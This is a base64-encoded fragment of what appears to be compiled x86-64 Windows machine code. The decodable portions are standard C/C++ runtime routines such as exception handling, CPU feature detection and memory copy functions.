Vm7AABIiQNIi8NIg8QgW8PMM8BIiUEQSI0FT7sAAEiJQQhIjQU0uwAASIkBSIvBw8xAU0iD7CBIi9lIi8JIjQ3BugAASIkLSI1TCDPJSIkKSIlKCEiNSAjoSCYAAEiLw0iDxCBbw8zMzEiJXCQIV0iD7CBIjQWLugAASIv5SIkBi9pIg8EI6KomAAD2wwF0DboYAAAASIvP6GTz//9Ii8dIi1wkMEiDxCBfw8zMSIPsSEiNTCQg6Pb+//9IjRXjQQEASI1MJCDoxSAAAMxIg+xISI1MJCDoNv///0iNFUtCAQBIjUwkIOilIAAAzEiDeQgASI0FHLoAAEgPRUEIw8zMSIlcJCBVSIvsSIPsIEiDZRgASLsyot8tmSsAAEiLBalWAQBIO8N1b0iNTRj/FUq3AABIi0UYSIlFEP8VNLcAAIvASDFFEP8VILcAAIvASI1NIEgxRRD/FQi3AACLRSBIjU0QSMHgIEgzRSBIM0UQSDPBSLn///////8AAEgjwUi5M6LfLZkrAABIO8NID0TBSIkFNVYBAEiLXCRISPfQSIkFLlYBAEiDxCBdw0iNDamgAQBI/yXKtgAAzMxIjQ2ZoAEA6bwlAABIjQWdoAEAw0iNBZ2gAQDDSIPsKOjn////SIMIBOjm////SIMIAkiDxCjDzEiNBUGsAQDDgyV5oAEAAMNIiVwkCFVIjawkQPv//0iB7MAFAACL2bkXAAAA6IWqAACFwHQEi8vNKYMlSKABAABIjU3wM9JBuNAEAADoNyAAAEiNTfD/FdW1AABIi53oAAAASI2V2AQAAEiLy0UzwP8Vw7UAAEiFwHQ8SINkJDgASI2N4AQAAEiLldgEAABMi8hIiUwkMEyLw0iNjegEAABIiUwkKEiNTfBIiUwkIDPJ/xWKtQAASIuFyAQAAEiNTCRQSImF6AAAADPSSI2FyAQAAEG4mAAAAEiDwAhIiYWIAAAA6KAfAABIi4XIBAAASIlEJGDHRCRQFQAAQMdEJFQBAAAA/xWOtQAAg/gBSI1EJFBIiUQkQEiNRfAPlMNIiUQkSDPJ/xUltQAASI1MJED/FRK1AACFwHUK9tsbwCEFRJ8BAEiLnCTQBQAASIHEwAUAAF3DzMzMSIlcJAhIiXQkEFdIg+wgSI0d6i8BAEiNNeMvAQDrFkiLO0iF/3QKSIvP6FX0////10iDwwhIO95y5UiLXCQwSIt0JDhIg8QgX8PMzEiJXCQISIl0JBBXSIPsIEiNHa4vAQBIjTWnLwEA6xZIiztIhf90CkiLz+gJ9P///9dIg8MISDvecuVIi1wkMEiLdCQ4SIPEIF/DzMxIiVwkEEiJfCQYVUiL7EiD7CCDZegAM8kzwMcF4FMBAAIAAAAPokSLwccFzVMBAAEAAACB8WNBTUREi8pEi9JBgfFlbnRpQYHyaW5lSUGB8G50ZWxFC9BEi9tEiwU7ngEAQYHzQXV0aEUL2YvTRAvZgfJHZW51M8mL+EQL0rgBAAAAD6KJRfBEi8lEiU34i8iJXfSJVfxFhdJ1UkiDDWVTAQD/QYPIBCXwP/8PRIkF6Z0BAD3ABgEAdCg9YAYCAHQhPXAGAgB0GgWw+fz/g/ggdxtIuwEAAQABAAAASA+jw3MLQYPIAUSJBa+dAQBFhdt1GYHhAA/wD4H5AA9gAHILQYPIBESJBZGdAQC4BwAAAIlV4ESJTeQ7+HwkM8kPoolF8Ild9IlN+IlV/Ild6A+64wlzC0GDyAJEiQVdnQEAQQ+64RRzbscFsFIBAAIAAADHBapSAQAGAAAAQQ+64RtzU0EPuuEcc0wzyQ8B0EjB4iBIC9BIiVUQSItFECQGPAZ1MosFfFIBAIPICMcFa1IBAAMAAAD2ReggiQVlUgEAdBODyCDHBVJSAQAFAAAAiQVQUgEASItcJDgzwEiLfCRASIPEIF3DzMy4AQAAAMPMzDPAOQV4qAEAD5XAw0iD7ChNi0E4SIvKSYvR6A0AAAC4AQAAAEiDxCjDzMzMQFNFixhIi9pBg+P4TIvJQfYABEyL0XQTQYtACE1jUAT32EwD0UhjyEwj0Uljw0qLFBBIi0MQi0gISANLCPZBAw90Cg+2QQOD4PBMA8hMM8pJi8lb6aPt///MzMxIhcl0f0iJXCQIiFQkEFdIg+wggTljc23gdV+DeRgEdVmLQSAtIAWTGYP4AndMSItBMEiFwHRDSGNQBIXSdBZIA1E4SItJKOgMCgAAkOsr6AA/AACQ9gAQdCBIi0EoSIs4SIX/dBRIiwdIi1gQSIvL6B/x//9Ii8//00iLXCQwSIPEIF/DzMzMQFNIg+wgSIvZSIvCSI0NLbQAAEiJC0iNUwgzyUiJCkiJSghIjUgI6LQfAABIjQWdtAAASIkDSIvDSIPEIFvDzDPASIlBEEiNBZO0AABIiUEISI0FeLQAAEiJAUiLwcPMSI0F2bMAAEiJAUiDwQjp/R8AAMxIi8RIiVgISIloGFZXQVRBVkFXSIPsUEyLvCSgAAAASYvpTIvyTI1IEE2L4EiL2U2Lx0iL1UmLzujfEwAATIuMJLAAAABIi/hIi7QkqAAAAE2FyXQOTIvGSIvQSIvL6D0JAADoxBcAAEhjTgxMi89IA8FNi8SKjCTYAAAAiEwkQEiLjCS4AAAASIlsJDhMiXwkMIsRSYvOiVQkKEiL00iJRCQg6AwYAABMjVwkUEmLWzBJi2tASYvjQV9BXkFcX17DzMzMSIlcJAhXSIPsIEyLCUmL2EGDIABBuGNzbeBFOQF1WkGDeRgEvwEAAABBuiAFkxl1G0GLQSBBK8KD+AJ3D0iLQihJOUEoiwsPRM+JC0U5AXUoQYN5GAR1IUGLSSBBK8qD+QJ3FUmDeTAAdQ7oCCQAAIl4QIvHiTvrAjPASItcJDBIg8QgX8PMzEiLxEiJWAhIiXAQSIl4IEyJQBhVQVRBVUFWQVdIjWjBSIHssAAAAEiLXWdMi+pIi/lFM+RIi8tEiGXHSYvRRIhlyE2L+U2L8Oh3JQAATI1N70yLw0mL10mLzYvw6G8SAABMi8NJi9dJi83o4SQAAEyLw0mL1zvwfh9Ei85IjU3v6PckAABEi85Mi8NJi9dJi83o8iQAAOsKSYvN6LAkAACL8IP+/w+MHQQAADtzBA+NFAQAAIE/Y3Nt4A+FYwMAAIN/GAQPhRgBAACLRyAtIAWTGYP4Ag+HBwEAAEw5ZzAPhf0AAADoBiMAAEw5YCAPhGsDAADo9yIAAEiLeCDo7iIAAEiLTzjGRccBTItwKEyJdVfoORYAAEiF/w+EkAMAAIE/Y3Nt4HUdg38YBHUXi0cgLSAFkxmD+AJ3Ckw5ZzAPhDsDAADopiIAAEw5YDgPhI4AAADolyIAAEyLcDjojiIAAEmL1kiLz0yJYDjoywUAAITAdWlFi/xFOSYPjgUDAABJi/ToVxUAAEljTgRIA8ZEOWQBBHQb6EQVAABJY04ESAPGSGNcAQToMxUAAEgDw+sDSYvESI1ICEiNFTiSAQDoEx0AAIXAD4S/AgAAQf/HSIPGFEU7Pnyr6agCAABMi3VXgT9jc23gD4U1AgAAg38YBA+FKwIAAItHIC0gBZMZg/gCD4caAgAARDljDA+GTgEAAESLRXdIjUXXTIl8JDBEi85IiUQkKEiL00iNRctJi81IiUQkIOhgEQAAi03Li1XXO8oPgxcBAABMjXAQQTl28A+P6wAAAEE7dvQPj+EAAADoeRQAAE1jJkwD4EGLRvyJRdOFwA+OwQAAAOhzFAAASItPMEiDwARIY1EMSAPCSIlF3+hbFAAASItPMEhjUQyLDBCJTc+FyX436EQUAABIi03fTItHMEhjCUgDwUmLzEiL0EiJRefoTw4AAIXAdRyLRc9Ig0XfBP/IiUXPhcB/yYtF0//ISYPEFOuEikVvTYvPTItFV0mL1YhEJFhIi8+KRceIRCRQSItFf0iJRCRIi0V3iUQkQEmNRvBIiUQkOEiLRedIiUQkMEyJZCQoSIlcJCDGRcgB6Hf7//+LVdeLTcv/wUmDxhSJTcs7yg+C+v7//0Uz5EQ4ZcgPhbIAAACLAyX///8fPSEFkxkPgqAAAABEOWMgdA7oYhMAAEhjSyBIA8HrA0mLxEiFwHUV9kMkBHR+SIvTSYvP6LwOAACFwHVv9kMkBA+FCAEAAEQ5YyB0EegnEwAASIvQSGNDIEgD0OsDSYvUSIvP6GwDAACEwHU/TI1N50yLw0mL10mLzejqDgAAik1vTIvITItFV0iL14hMJEBJi81MiXwkOEiJXCQwg0wkKP9MiWQkIOhVEwAA6NgfAABMOWA4dEHpmQAAAEQ5Ywx26kQ4ZW8PhY8AAABIi0V/TYvPSIlEJDhNi8aLRXdJi9WJRCQwSIvPiXQkKEiJXCQg6HMAAADrtEyNnCSwAAAASYtbMEmLczhJi3tISYvjQV9BXkFdQVxdw+iHOAAAzOiBOAAAzLIBSIvP6CL5//9IjU336OH5//9IjRVqNgEASI1N9+hdFAAAzOhXOAAAzOhROAAAzOhLOAAAzOhFOAAAzOg/OAAAzMzMSIlcJBBMiUQkGFVWV0FUQVVBVkFXSIPscIE5AwAAgE2L+UmL+EyL4kiL8Q+EGwIAAOjqHgAARIusJOAAAABIi6wk0AAAAEiDeBAAdFYzyf8V+6oAAEiL2OjDHgAASDlYEHRAgT5NT0PgdDiBPlJDQ+B0MEiLhCToAAAATYvPSIlEJDBMi8dEiWwkKEmL1EiLzkiJbCQg6IkQAACFwA+FqQEAAIN9DAAPhLcBAABEi7Qk2AAAAEiNRCRgTIl8JDBFi85IiUQkKEWLxUiNhCSwAAAASIvVSYvMSIlEJCDo6g0AAIuMJLAAAAA7TCRgD4NZAQAASI14DEQ7d/QPjDQBAABEO3f4D48qAQAA6AARAACLD//JSGPJSI0UiUiNDJBIY0cEg3wIBAB0J+jhEAAAiw//yUhjyUiNFIlIjQyQSGNHBEhjXAgE6MQQAABIA8PrAjPASIXAdFLosxAAAIsP/8lIY8lIjRSJSI0MkEhjRwSDfAgEAHQn6JQQAACLD//JSGPJSI0UiUiNDJBIY0cESGNcCATodxAAAEgDw+sCM8CAeBAAD4WEAAAA6GEQAACLD//JSGPJSI0UiUiNDJBIY0cE9gQIQHVm6EMQAACLD02Lz0yLhCTAAAAA/8nGRCRYAMZEJFABSGPJSI0UiUhjTwRIjQSQSYvUSAPISIuEJOgAAABIiUQkSEiNR/REiWwkQEiJRCQ4SINkJDAASIlMJChIi85IiWwkIOi29///i4wksAAAAP/BSIPHFImMJLAAAAA7TCRgD4Kr/v//SIucJLgAAABIg8RwQV9BXkFdQVxfXl3D6NM1AADMzMxIiVwkCEiJbCQQSIl0JBhXQVRBVUFWQVdIg+wgSIvyTIvpSIXSD4ShAAAARTL2M/85On546H8PAABIi9BJi0UwTGN4DEmDxwRMA/roaA8AAEiL0EmLRTBIY0gMiywKhe1+REhjx0yNJIDoSg8AAEiL2EljB0gD2OgoDwAASGNOBEiL002LRTBKjQSgSAPI6E0JAACFwHUM/81Jg8cEhe1/yOsDQbYB/8c7PnyISItcJFBBisZIi2wkWEiLdCRgSIPEIEFfQV5BXUFcX8Po/zQAAMzMzEj/4sxIi8JJi9BI/+DMzMxJi8BMi9JIi9BFi8FJ/+LMSGMCSAPBg3oEAHwWTGNKBEhjUghJiwwJTGMECk0DwUkDwMPMSIlcJAhIiXQkEEiJfCQYQVZIg+wgSYv5TIvxM9tBORh9BUiL8usHSWNwCEgDMuiRAAAAg+gBdDyD+AF1ZjlfGHQP6FkOAABIi9hIY0cYSAPYSI1XCEmLTijofv///0yLwEG5AQAAAEiL00iLzuha////6y85Xxh0D+giDgAASIvYSGNHGEgD2EiNVwhJi04o6Ef///9Mi8BIi9NIi87oHf///+sG6A40AACQSItcJDBIi3QkOEiLfCRASIPEIEFew8zMzEiJXCQISIl0JBBIiXwkGEFVQVZBV0iD7DBNi/FJi9hIi/JMi+kz/0WLeARFhf90Dk1j/+iQDQAASY0UB+sDSIvXSIXSD4R6AQAARYX/dBHodA0AAEiLyEhjQwRIA8jrA0iLz0A4eRAPhFcBAAA5ewh1CDk7D41KAQAAiwuFyXgKSGNDCEgDBkiL8ITJeTNB9gYQdC1Iix1NkAEASIXbdCFIi8vojOX////TSIXAdA1IhfZ0CEiJBkiLyOtZ6DMzAAD2wQh0GEmLTShIhcl0CkiF9nQFSIkO6zzoFjMAAEH2BgF0R0mLVShIhdJ0OUiF9nQ0TWNGFEiLzugyFQAAQYN+FAgPhasAAABIOT4PhKIAAABIiw5JjVYI6Pr9//9IiQbpjgAAAOjJMgAAQYteGIXbdA5IY9vooQwAAEiNDAPrA0iLz0iFyXUwSYtNKEiFyXQiSIX2dB1JY14USY1WCOi0/f//SIvQTIvDSIvO6L4UAADrQOh7MgAASTl9KHQ5SIX2dDSF23QR6E8MAABIi8hJY0YYSAPI6wNIi89Ihcl0F0GKBiQE9tgbyffZ/8GL+YlMJCCLx+sO6DcyAACQ6DEyAACQM8BIi1wkUEiLdCRYSIt8JGBIg8QwQV9BXkFdw0BTVldBVEFVQVZBV0iD7HBIi/lFM/9EiXwkIEQhvCSwAAAATCF8JChMIbwkyAAAAOjDGAAATItoKEyJbCRA6LUYAABIi0AgSImEJMAAAABIi3dQSIm0JLgAAABIi0dISIlEJDBIi19ASItHMEiJRCRITIt3KEyJdCRQSIvL6A4bAADocRgAAEiJcCDoaBgAAEiJWCjoXxgAAEiLUCBIi1IoSI1MJGDoqQoAAEyL4EiJRCQ4TDl/WHQcx4QksAAAAAEAAADoLxgAAEiLSHBIiYwkyAAAAEG4AAEAAEmL1kiLTCRI6GgaAABIi9hIiUQkKEiLvCTAAAAA63jHRCQgAQAAAOjxFwAAg2BAAEiLtCS4AAAAg7wksAAAAAB0IbIBSIvO6Jnx//9Ii4QkyAAAAEyNSCBEi0AYi1AEiwjrDUyNTiBEi0YYi1YEiw7/Fd+jAABEi3wkIEiLXCQoTItsJEBIi7wkwAAAAEyLdCRQTItkJDhJi8zoFgoAAEWF/3UygT5jc23gdSqDfhgEdSSLRiAtIAWTGYP4AncXSItOKOhtCgAAhcB0CrIBSIvO6A/x///oQhcAAEiJeCDoORcAAEyJaChIi0QkMEhjSBxJiwZIxwQB/v///0iLw0iDxHBBX0FeQV1BXF9eW8PMzEiD7ChIiwGBOFJDQ+B0EoE4TU9D4HQKgThjc23gdRXrGujmFgAAg3gwAH4I6NsWAAD/SDAzwEiDxCjD6MwWAACDYDAA6N8vAADMzMxIi8REiUggTIlAGEiJUBBIiUgIU1ZXQVRBVUFWQVdIg+wwRYvhSYvwTIvqTIv56H0JAABIiUQkKEyLxkmL1UmLz+iyFwAAi/jocxYAAP9AMIP//w+E9gAAAEE7/A+O7QAAAIP//w+O3gAAADt+BA+N1QAAAExj9+g0CQAASGNOCEqNBPCLPAGJfCQg6CAJAABIY04ISo0E8IN8AQQAdBzoDAkAAEhjTghKjQTwSGNcAQTo+ggAAEgDw+sCM8BIhcB0XkSLz0yLxkmL1UmLz+h5FwAA6NgIAABIY04ISo0E8IN8AQQAdBzoxAgAAEhjTghKjQTwSGNcAQTosggAAEgDw+sCM8BBuAMBAABJi9dIi8joAhgAAEiLTCQo6OgIAADrHkSLpCSIAAAASIu0JIAAAABMi2wkeEyLfCRwi3wkIIl8JCTpB////+iOLgAAkOhsFQAAg3gwAH4I6GEVAAD/SDCD//90C0E7/H4G6GsuAADMRIvPTIvGSYvVSYvP6MkWAABIg8QwQV9BXkFdQVxfXlvDzEiJXCQISIlsJBBIiXQkGFdBVEFVQVZBV0iD7EBIi/FNi/FJi8hNi+hMi/rolBcAAOj3FAAASIu8JJAAAAAz273///8fuiIFkxlBuCkAAIBBuSYAAIBBvAEAAAA5WEB1NIE+Y3Nt4HQsRDkGdRCDfhgPdQpIgX5gIAWTGXQXRDkOdBKLDyPNO8pyCkSEZyQPhZUBAACLRgSoZg+ElAAAADlfBA+EgQEAADmcJJgAAAAPhXQBAACD4CB0P0Q5DnU6TYuF+AAAAEmL1kiLz+g3FgAAg/j/D4xwAQAAO0cED41nAQAARIvISYvPSYvWTIvH6Hj9///pMAEAAIXAdCNEOQZ1HkSLTjhBg/n/D4xAAQAARDtPBA+NNgEAAEiLTijryUyLx0mL1kmLz+jWBAAA6fYAAAA5Xwx1QYsHI8U9IQWTGXIgOV8gdBPozwYAAEhjTyC6IgWTGUgDwesDSIvDSIXAdRaLByPFO8IPgroAAAD2RyQED4SwAAAAgT5jc23gdW+DfhgDcmk5ViB2ZEiLRjA5WAh0EuiWBgAASItOMEhjaQhIA+jrA0iL60iF7XRBD7acJKgAAABIi83oyd7//0iLhCSgAAAATYvOiVwkOE2LxUiJRCQwSYvXi4QkmAAAAEiLzolEJChIiXwkIP/V6zxIi4QkoAAAAE2LzkiJRCQ4TYvFi4QkmAAAAEmL14lEJDBIi86KhCSoAAAAiEQkKEiJfCQg6BPv//9Bi8RMjVwkQEmLWzBJi2s4SYtzQEmL40FfQV5BXUFcX8Po+SsAAMzo8ysAAMzMzEiLxEiJWAhIiWgQSIlwGEiJeCBBVkiD7CCLcQQz202L8EiL6kiL+YX2dA5IY/bokQUAAEiNDAbrA0iLy0iFyQ+E2QAAAIX2dA9IY3cE6HIFAABIjQwG6wNIi8s4WRAPhLoAAAD2B4B0CvZFABAPhasAAACF9nQR6EgFAABIi/BIY0cESAPw6wNIi/PoSAUAAEiLyEhjRQRIA8hIO/F0SzlfBHQR6BsFAABIi/BIY0cESAPw6wNIi/PoGwUAAExjRQRJg8AQTAPASI1GEEwrwA+2CEIPthQAK8p1B0j/wIXSde2FyXQEM8DrObAChEUAdAX2Bwh0JEH2BgF0BfYHAXQZQfYGBHQF9gcEdA5BhAZ0BIQHdAW7AQAAAIvD6wW4AQAAAEiLXCQwSItsJDhIi3QkQEiLfCRISIPEIEFew8zMSIlcJAhIiWwkEEiJdCQYV0iD7CBIi/JIi9FIi87oRhMAAIt+DIvoM9vrJP/P6GIRAABIjRS/SItAYEiNDJBIY0YQSAPBO2gEfgU7aAh+B4X/ddhIi8NIi2wkOEiFwEiLdCRAD5XDi8NIi1wkMEiDxCBfw8xIiVwkEEiJbCQYVldBVEFWQVdIg+wgQYt4DEyL4UmLyEmL8U2L8EyL+ujGEgAATYsUJIvoTIkWhf90dEljRhD/z0iNFL9IjRyQSQNfCDtrBH7lO2sIf+BJiw9IjVQkUEUzwP8VcJwAAExjQxAzyUwDRCRQRItLDESLEEWFyXQXSY1QDEhjAkk7wnQL/8FIg8IUQTvJcu1BO8lznEmLBCRIjQyJSWNMiBBIiwwBSIkOSItcJFhIi8ZIi2wkYEiDxCBBX0FeQVxfXsPMzMxIi8RIiVgISIloEEiJcBhIiXggQVRBVkFXSIPsIItyDEiL+kiLbCRwSIvPSIvVRYvhM9vo8BEAAESL2IX2D4TgAAAATItUJGiL1kyLRCRgQYMK/0GDCP9Mi3UITGN/EESNSv9LjQyJSY0EjkY7XDgEfgdGO1w4CH4IQYvRRYXJdd6F0nQOjUL/SI0EgEmNHIdJA94z0oX2dH5FM8lIY08QSANNCEkDyUiF23QPi0MEOQF+IotDCDlBBH8aRDshfBVEO2EEfw9Bgzj/dQNBiRCNQgFBiQL/wkmDwRQ71nK9QYM4/3QyQYsASI0MgEhjRxBIjQSISANFCEiLXCRASItsJEhIi3QkUEiLfCRYSIPEIEFfQV5BXMNBgyAAQYMiADPA69XoSCgAAMzMzMxIiVwkCEiJbCQQVldBVkiD7CBMjUwkUEmL+EiL6ujm/f//SIvVSIvPTIvw6MwQAACLXwyL8Osk/8vo6g4AAEiNFJtIi0BgSI0MkEhjRxBIA8E7cAR+BTtwCH4Ghdt12DPASIXAdQZBg8n/6wREi0gETIvHSIvVSYvO6Or3//9Ii1wkQEiLbCRISIPEIEFeX17DzMzMSIlcJAhIiWwkEEiJdCQYV0iD7EBJi/FJi+hIi9pIi/nobw4AAEiJWHBIix/oYw4AAEiLUzhMi8ZIi0wkeDPbTItMJHDHRCQ4AQAAAEiJUGhIi9VIiVwkMIlcJChIiUwkIEiLD+j/+P//6CYOAABIi4wkgAAAAEiLbCRYSIt0JGBIiVhwjUMBSItcJFDHAQEAAABIg8RAX8NIi8RMiUggTIlAGEiJUBBIiUgIU1dIg+xoSIv5g2DIAEiJSNBMiUDY6M8NAABIi1gQSIvL6B/Z//9IjVQkSIsP/9PHRCRAAAAAAOsAi0QkQEiDxGhfW8PMQFNIg+wgSIvZSIkR6JMNAABIO1hYcwvoiA0AAEiLSFjrAjPJSIlLCOh3DQAASIlYWEiLw0iDxCBbw8zMSIlcJAhXSIPsIEiL+ehWDQAASDt4WHU56EsNAABIi1hY6wlIO/t0C0iLWwhIhdt18usY6DANAABIi0sISItcJDBIiUhYSIPEIF/D6DQmAADM6C4mAADMzEiD7CjoBw0AAEiLQGBIg8Qow8zMSIPsKOjzDAAASItAaEiDxCjDzMxAU0iD7CBIi9no2gwAAEiLUFjrCUg5GnQSSItSCEiF0nXyjUIBSIPEIFvDM8Dr9sxAU0iD7CBIi9noqgwAAEiJWGBIg8QgW8NAU0iD7CBIi9nokgwAAEiJWGhIg8QgW8NAVUiNrCRQ+///SIHssAUAAEiLBcg3AQBIM8RIiYWgBAAATIuV+AQAAEiNBaCbAAAPEABMi9lIjUwkMA8QSBAPEQEPEEAgDxFJEA8QSDAPEUEgDxBAQA8RSTAPEEhQDxFBQA8QQGAPEUlQDxCIgAAAAA8RQWAPEEBwSIuAkAAAAA8RQXAPEYmAAAAASImBkAAAAEiNBffy//9JiwtIiUQkUEiLheAEAABIiUQkYEhjhegEAABIiUQkaEiLhfAEAABIiUQkeA+2hQAFAABIiUWISYtCQEiJRCQoSI1F0EyJTCRYRTPJTIlEJHBMjUQkMEiJVYBJixJIiUQkIEjHRZAgBZMZ/xW/lwAASIuNoAQAAEgzzOjY0v//SIHEsAUAAF3DzMzMSIlcJBBIiXQkGFdIg+xASYvZSIlUJFBJi/hIi/HoQgsAAEiLUwhIiVBg6DULAABIi1Y4SIlQaOgoCwAASItLOEyLy0yLx4sRSIvOSANQYDPAiUQkOEiJRCQwiUQkKEiJVCQgSI1UJFDoy/X//0iLXCRYSIt0JGBIg8RAX8PMzMxIiVwkEEiJdCQYVVdBVkiL7EiD7GAPKAWwmgAASIvyDygNtpoAAEyL8Q8pRcAPKAW4mgAADylN0A8oDb2aAAAPKUXgDylN8EiF0nQi9gIQdB1IizlIi0f4SItYQEiLcDBIi8vo2NX//0iNT/j/00iNVSBMiXXoSIvOSIl18P8ViZYAAEiJRSBIi9BIiUX4SIX2dBv2Bgi5AECZAXQFiU3g6wyLReBIhdIPRMGJReBEi0XYTI1N4ItVxItNwP8VWpYAAEyNXCRgSYtbKEmLczBJi+NBXl9dw8zMzMzMzMzMzMzMZmYPH4QAAAAAAEyL2Q+20km5AQEBAQEBAQFMD6/KSYP4EA+GAgEAAGZJD27BZg9gwEmB+IAAAAAPhnwAAAAPuiXIfwEAAXMii8JIi9dIi/lJi8jzqkiL+kmLw8NmZmZmZmYPH4QAAAAAAA8RAUwDwUiDwRBIg+HwTCvBTYvIScHpB3Q2Zg8fRAAADykBDylBEEiBwYAAAAAPKUGgDylBsEn/yQ8pQcAPKUHQDylB4GYPKUHwddRJg+B/TYvIScHpBHQTDx+AAAAAAA8RAUiDwRBJ/8l19EmD4A90BkEPEUQI8EmLw8MuTAAAK0wAAFdMAAAnTAAANEwAAERMAABUTAAAJEwAAFxMAAA4TAAAcEwAAGBMAAAwTAAAQEwAAFBMAAAgTAAAeEwAAEmL0UyNDfaz//9Di4SBvEsAAEwDyEkDyEmLw0H/4WaQSIlR8YlR+WaJUf2IUf/DkEiJUfSJUfzDSIlR94hR/8NIiVHziVH7iFH/ww8fRAAASIlR8olR+maJUf7DSIkQw0iJEGaJUAiIUArDDx9EAABIiRBmiVAIw0iJEEiJUAjDSIlcJAhIiWwkEEiJdCQYV0FUQVVBVkFXSIPsQE2LYQhIi+lNizlJi8hJi1k4TSv8TYvxSYv4TIvq6LIKAAD2RQRmD4XgAAAAQYt2SEiJbCQwSIl8JDg7Mw+DegEAAIv+SAP/i0T7BEw7+A+CqgAAAItE+whMO/gPg50AAACDfPsQAA+EkgAAAIN8+wwBdBeLRPsMSI1MJDBJA8RJi9X/0IXAeH1+dIF9AGNzbeB1KEiDPbGWAAAAdB5IjQ2olgAA6CuIAACFwHQOugEAAABIi83/FZGWAACLTPsQQbgBAAAASQPMSYvV6FQKAABJi0ZATIvFi1T7EEmLzUSLTQBJA9RIiUQkKEmLRihIiUQkIP8Vg5MAAOhWCgAA/8bpNf///zPA6bUAAABJi3YgQYt+SEkr9OmWAAAAi89IA8mLRMsETDv4D4KCAAAAi0TLCEw7+HN5RItVBEGD4iB0REUzyYXSdDhFi8FNA8BCi0TDBEg78HIgQotEwwhIO/BzFotEyxBCOUTDEHULi0TLDEI5RMMMdAhB/8FEO8pyyEQ7ynU3i0TLEIXAdAxIO/B1HkWF0nUl6xeNRwFJi9VBiUZIRItEywyxAU0DxEH/0P/HixM7+g+CYP///7gBAAAATI1cJEBJi1swSYtrOEmLc0BJi+NBX0FeQV1BXF/DzEiD7CjoHw4AAOiODQAA6GUJAACEwHUEMsDrEugQBwAAhMB1B+iXCQAA6+ywAUiDxCjDzMxIg+wo6DsGAABIhcAPlcBIg8Qow0iD7Cgzyei5BQAAsAFIg8Qow8zMSIPsKITJdRHoBwcAAOhSCQAAM8nocw0AALABSIPEKMNIg+wo6OsGAACwAUiDxCjDSIlcJAhIiXQkEEiJfCQYQVZIg+wggHkIAEyL8kiL8XRMSIsBSIXAdERIg8//SP/HgDw4AHX3SI1PAeiJDQAASIvYSIXAdBxMiwZIjVcBSIvI6L4eAABIi8NBxkYIAUmJBjPbSIvL6FUNAADrCkiLAUiJAsZCCABIi1wkMEiLdCQ4SIt8JEBIg8QgQV7DzMzMQFNIg+wggHkIAEiL2XQISIsJ6BkNAADGQwgASIMjAEiDxCBbw8zMzEg7ynQZSIPCCUiNQQlIK9CKCDoMEHUKSP/AhMl18jPAwxvAg8gBw8xAU0iD7CD/FSyRAABIhcB0E0iLGEiLyOh4HgAASIvDSIXbde1Ig8QgW8PMzMzMzMzMzMzMzMzMzMzMzMzMzGZmDx+EAAAAAABMi9lMi9JJg/gQD4ZwAAAASYP4IHZKSCvRcw9Ji8JJA8BIO8gPjDYDAABJgfiAAAAAD4ZpAgAAD7oldXoBAAEPg6sBAABJi8NMi99Ii/lJi8hMi8ZJi/LzpEmL8EmL+8MPEAJBDxBMEPAPEQFBDxFMCPBIi8HDZmYPH4QAAAAAAEiLwUyNDUav//9Di4yBx1AAAEkDyf/hEFEAAC9RAAARUQAAH1EAAFtRAABgUQAAcFEAAIBRAAAYUQAAsFEAAMBRAABAUQAA0FEAAJhRAADgUQAAAFIAADVRAAAPH0QAAMMPtwpmiQjDSIsKSIkIww+3CkQPtkICZokIRIhAAsMPtgqICMPzD28C8w9/AMNmkEyLAg+3SghED7ZKCkyJAGaJSAhEiEgKSYvLw4sKiQjDiwpED7ZCBIkIRIhABMNmkIsKRA+3QgSJCGZEiUAEw5CLCkQPt0IERA+2SgaJCGZEiUAERIhIBsNMiwKLSghED7ZKDEyJAIlICESISAzDZpBMiwIPtkoITIkAiEgIw2aQTIsCD7dKCEyJAGaJSAjDkEyLAotKCEyJAIlICMMPHwBMiwKLSghED7dKDEyJAIlICGZEiUgMw2YPH4QAAAAAAEyLAotKCEQPt0oMRA+2Ug5MiQCJSAhmRIlIDESIUA7DDxAECkwDwUiDwRBB9sMPdBMPKMhIg+HwDxAECkiDwRBBDxELTCvBTYvIScHpBw+EiAAAAA8pQfBMOw3xLQEAdhfpwgAAAGZmDx+EAAAAAAAPKUHgDylJ8A8QBAoPEEwKEEiBwYAAAAAPKUGADylJkA8QRAqgDxBMCrBJ/8kPKUGgDylJsA8QRArADxBMCtAPKUHADylJ0A8QRArgDxBMCvB1rQ8pQeBJg+B/DyjB6wwPEAQKSIPBEEmD6BBNi8hJwekEdBxmZmYPH4QAAAAAAA8RQfAPEAQKSIPBEEn/yXXvSYPgD3QNSY0ECA8QTALwDxFI8A8RQfBJi8PDDx9AAA8rQeAPK0nwDxiECgACAAAPEAQKDxBMChBIgcGAAAAADytBgA8rSZAPEEQKoA8QTAqwSf/JDytBoA8rSbAPEEQKwA8QTArQDxiECkACAAAPK0HADytJ0A8QRArgDxBMCvB1nQ+u+Ok4////Dx9EAABJA8gPEEQK8EiD6RBJg+gQ9sEPdBdIi8FIg+HwDxDIDxAECg8RCEyLwU0rw02LyEnB6Qd0aA8pAesNZg8fRAAADylBEA8pCQ8QRArwDxBMCuBIgemAAAAADylBcA8pSWAPEEQKUA8QTApASf/JDylBUA8pSUAPEEQKMA8QTAogDylBMA8pSSAPEEQKEA8QDAp1rg8pQRBJg+B/DyjBTYvIScHpBHQaZmYPH4QAAAAAAA8RAUiD6RAPEAQKSf/JdfBJg+APdAhBDxAKQQ8RCw8RAUmLw8PMzMxIg+woSIXJdBFIjQV4dgEASDvIdAXo+hkAAEiDxCjDzEBTSIPsIEiL2YsNySsBAIP5/3QzSIXbdQ7oPgYAAIsNtCsBAEiL2DPS6IIGAABIhdt0FEiNBS52AQBIO9h0CEiLy+itGQAASIPEIFvDzMzMSIPsKOgTAAAASIXAdAVIg8Qow+gsGgAAzMzMzEiJXCQISIl0JBBXSIPsIIM9VisBAP91BzPA6YkAAAD/FU+LAACLDUErAQCL+Oi+BQAASIPK/zP2SDvCdGBIhcB0BUiL8OtWiw0fKwEA6PIFAACFwHRHungAAACNSonoHRoAAIsNAysBAEiL2EiFwHQSSIvQ6MsFAACFwHUPiw3pKgEAM9LougUAAOsJSIvLSIveSIvxSIvL6OsYAACLz/8Vj4sAAEiLxkiLXCQwSIt0JDhIg8QgX8NIg+woSI0Nsf7//+iABAAAiQWeKgEAg/j/dQQywOsbSI0VHnUBAIvI6F8FAACFwHUH6AoAAADr47ABSIPEKMPMSIPsKIsNaioBAIP5/3QM6JAEAACDDVkqAQD/sAFIg8Qow8zMSIPsKE1jSBxNi9BIiwFBiwQBg/j+dQtMiwJJi8roggAAAEiDxCjDzEBTSIPsIEyNTCRASYvY6G3t//9IiwhIY